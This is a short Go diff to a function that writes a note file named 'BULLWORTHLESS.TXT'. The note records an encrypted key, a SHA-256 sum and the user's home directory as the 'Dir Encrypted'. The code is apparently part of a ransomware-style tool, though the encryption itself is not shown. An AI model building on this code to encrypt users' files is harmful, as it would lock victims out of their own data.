@@ -172,13 +172,13 @@ func writeNote(shaSum string, hexKey string) {
 	if err != nil {
 		fmt.Println(err)
 	}
-	n, err := os.Create("BULLWORTHLESS.txt")
+	n, err := os.Create("BULLWORTHLESS.TXT")
 	if err != nil {
 		fmt.Println(err)
 	}
 	defer n.Close()
 	home, _ := os.UserHomeDir()
-	s := fmt.Sprintf("\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
+	s := fmt.Sprintf("\nEncrypted key: %s \nSha256Sum: %s \nDir Encrypted: %s", hexKey, shaSum, home)
 	_, err = n.WriteString(s)
 	if err != nil {
 		fmt.Println("Error writing file: ", err)
